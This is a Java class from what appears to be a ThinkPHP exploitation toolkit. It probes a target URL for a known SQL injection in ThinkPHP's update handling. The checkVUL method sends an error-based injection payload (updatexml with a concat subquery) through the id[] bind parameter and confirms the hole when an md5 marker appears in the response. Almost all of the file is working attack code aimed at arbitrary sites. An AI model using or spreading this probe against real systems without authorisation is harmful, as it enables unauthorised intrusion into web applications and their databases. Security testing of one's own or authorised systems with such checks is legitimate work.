package com.leishianquan.thinkphpexp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

public class thinkphp_update_sql implements BasePayload {
    private static final String CheckStr="cf67355a3333e6e143439161adc2d82";

    public boolean checkVUL(String url) throws Exception{
        try {
            String test_result = HttpTool.getHttpReuest(url + "/index.php?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20md5(520)),0x7e),1))", "utf-8");
            if(test_result.contains(CheckStr)){
                return true;}

        } catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
        }
        return false;
    }


}